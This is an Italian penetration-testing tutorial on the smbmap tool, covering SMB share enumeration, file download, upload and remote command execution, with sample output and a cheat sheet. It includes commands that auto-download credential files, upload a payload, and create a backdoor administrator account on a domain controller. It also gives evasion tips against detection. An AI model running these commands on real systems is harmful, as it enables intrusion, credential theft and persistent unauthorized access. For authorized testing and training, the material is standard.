---
title: 'Smbmap: Enumerazione SMB e Share Discovery su Windows'
slug: smbmap
description: >-
  smbmap spiegato per pentest: enumerazione share SMB, permessi, file access e
  credential testing su sistemi Windows e Active Directory.
image: /smbmap.webp
draft: false
date: 2026-02-27T00:00:00.000Z
categories:
  - tools
subcategories:
  - enum
tags:
  - windows-enumeration
  - ad
---

**Smbmap** enumera share SMB su sistemi Windows e Samba mostrando permessi di lettura/scrittura per ogni share, il tutto senza bisogno di autenticazione o con credenziali fornite. È il primo tool che lanci quando trovi porta 445 aperta — in pochi secondi sai quali share sono accessibili, con quali permessi, e puoi navigare i contenuti o eseguire comandi.

A differenza di `smbclient` che richiede connessione manuale a ogni share, Smbmap automatizza l'enumerazione e mostra una mappa completa dei permessi. Nella kill chain si posiziona tra la fase di **Enumeration** e **Credential Access** (MITRE ATT\&CK T1135).

***

## 1️⃣ Setup e Installazione

```bash
pip install smbmap --break-system-packages
```

O su Kali (preinstallato):

```bash
smbmap --help
```

Versione: 1.9.2. Requisiti: Python 3.x, `impacket`, `pyasn1`.

***

## 2️⃣ Uso Base

**Enumerazione anonima:**

```bash
smbmap -H 10.10.10.50
```

Output:

```
[+] IP: 10.10.10.50:445   Name: 10.10.10.50
    Disk                Permissions     Comment
    ----                -----------     -------
    ADMIN$              NO ACCESS
    C$                  NO ACCESS
    IPC$                READ ONLY
    Backups             READ ONLY
    Users               READ, WRITE
```

**Con credenziali:**

```bash
smbmap -H 10.10.10.50 -u admin -p 'Password1' -d CORP
```

**Parametri chiave:**

* `-H host` → target
* `-u user` → username
* `-p pass` → password
* `-d domain` → dominio
* `-r path` → lista contenuti di una directory
* `--download path` → scarica file
* `-x command` → esecuzione comando (richiede admin)

***

## 3️⃣ Tecniche Operative

### Navigare i contenuti di una share

```bash
smbmap -H 10.10.10.50 -u admin -p 'Pass' -r 'Backups'
```

Output:

```
[+] Contents of \\10.10.10.50\Backups
    dr--r--r--   0  Thu Jan 15 14:32:11 2025  .
    dr--r--r--   0  Thu Jan 15 14:32:11 2025  ..
    -r--r--r--   15728640  Mon Dec 20 09:15:44 2024  db_backup.sql
    -r--r--r--   482  Wed Jan 10 11:20:33 2025  credentials.txt
```

### Download file

```bash
smbmap -H 10.10.10.50 -u admin -p 'Pass' --download 'Backups\credentials.txt'
```

### Command execution

```bash
smbmap -H 10.10.10.50 -u admin -p 'Pass' -x 'whoami'
```

Output: `corp\admin`

### Ricerca file ricorsiva

```bash
smbmap -H 10.10.10.50 -u admin -p 'Pass' -R -A '\.txt$|\.conf$|\.xml$|\.ini$'
```

`-R` ricorsivo, `-A regex` scarica automaticamente file che matchano il pattern.

***

## 4️⃣ Tecniche Avanzate

### Enumerazione multi-host

```bash
smbmap -H 10.10.10.50 -u admin -p 'Pass' --host-file targets.txt
```

### Null session

```bash
smbmap -H 10.10.10.50 -u '' -p ''
```

### Upload file su share scrivibile

```bash
smbmap -H 10.10.10.50 -u admin -p 'Pass' --upload payload.exe 'Users\Public\payload.exe'
```

Carica un payload su share con permesso WRITE.

***

## 5️⃣ Scenari Pratici di Pentest

### Scenario 1: Trovare file sensibili su share aperte

```bash
smbmap -H 10.10.10.50 -u guest -p '' -R -A 'pass|cred|backup|\.sql$'
```

**Output atteso:** download automatico di file contenenti credenziali.

**Timeline:** 1-3 minuti per enumerazione ricorsiva.

### Scenario 2: RCE via share admin

```bash
smbmap -H 10.10.10.50 -u da-admin -p 'DAPass!' -d CORP -x 'net user hacker P@ss123 /add && net localgroup administrators hacker /add'
```

**Timeline:** 2 secondi.

### Scenario 3: Enumerazione mass share su /24

```bash
for i in $(seq 1 254); do
  smbmap -H 10.10.10.$i -u '' -p '' 2>/dev/null
done
```

***

## 6️⃣ Toolchain Integration

**Flusso:** [Masscan](https://hackita.it/articoli/masscan) (porta 445) → **Smbmap (share enum)** → [Rpcclient](https://hackita.it/articoli/rpcclient)/[NetExec](https://hackita.it/articoli/netexec) (lateral movement)

| Tool       | Share enum | Permessi | RCE | Ricerca file |
| ---------- | ---------- | -------- | --- | ------------ |
| Smbmap     | Sì         | Sì       | Sì  | Sì (-R -A)   |
| Smbclient  | Sì         | Manuale  | No  | Manuale      |
| NetExec    | Sì         | Sì       | Sì  | Con moduli   |
| Enum4linux | Sì         | Limitato | No  | No           |

***

## 7️⃣ Attack Chain Completa

**Fase 1:** Masscan porta 445 → 15 host (3 min). **Fase 2:** Smbmap enumera share → trova `Backups` readable (1 min). **Fase 3:** Download `credentials.txt` → password domain admin (30 sec). **Fase 4:** Smbmap RCE sul DC (5 sec). **Timeline:** \~5 min.

***

## 8️⃣ Detection & Evasion

**Blue Team:** Windows Security Event ID 5140 (share access), 4625 (failed logon). **Evasion:** 1) Usa credenziali valide. 2) Accedi solo a share specifiche. 3) Orari lavorativi.

***

## 9️⃣ Performance & Scaling

Single host: 2-5 sec. /24: 3-5 min in loop.

***

## 🔟 Tabelle Tecniche

| Flag          | Descrizione         |
| ------------- | ------------------- |
| `-H host`     | Target              |
| `-u user`     | Username            |
| `-p pass`     | Password            |
| `-d domain`   | Dominio             |
| `-r path`     | Lista directory     |
| `-R`          | Ricorsivo           |
| `-A regex`    | Auto-download match |
| `--download`  | Scarica file        |
| `--upload`    | Carica file         |
| `-x cmd`      | Esegui comando      |
| `--host-file` | Lista target        |

***

## 11️⃣ Troubleshooting

| Problema               | Fix                                         |
| ---------------------- | ------------------------------------------- |
| `STATUS_ACCESS_DENIED` | Credenziali errate o permessi insufficienti |
| Timeout                | Host non raggiungibile su 445               |
| RCE fallisce           | Non sei admin locale                        |

***

## 12️⃣ FAQ

**Smbmap vs CrackMapExec?** Smbmap è focalizzato su share e file. CrackMapExec è più ampio (spray, exec, moduli). Complementari.

**Funziona su Samba Linux?** Sì.

***

## 13️⃣ Cheat Sheet

| Azione            | Comando                                                    |
| ----------------- | ---------------------------------------------------------- |
| Enum anonima      | `smbmap -H target`                                         |
| Con credenziali   | `smbmap -H target -u user -p pass -d DOMAIN`               |
| Lista directory   | `smbmap -H target -u user -p pass -r 'Share'`              |
| Download file     | `smbmap -H target -u user -p pass --download 'Share\file'` |
| RCE               | `smbmap -H target -u user -p pass -x 'whoami'`             |
| Ricerca ricorsiva | `smbmap -H target -u user -p pass -R -A 'regex'`           |

***

**Disclaimer:** Smbmap è per penetration test autorizzati. L'accesso non autorizzato a share SMB è reato. Repository: [github.com/ShawnDEvans/smbmap](https://github.com/ShawnDEvans/smbmap).

***

Vuoi supportare HackIta? Visita [hackita.it/supporto](https://hackita.it/supporto) per donazioni. Per penetration test professionali e formazione 1:1, scopri [hackita.it/servizi](https://hackita.it/servizi).
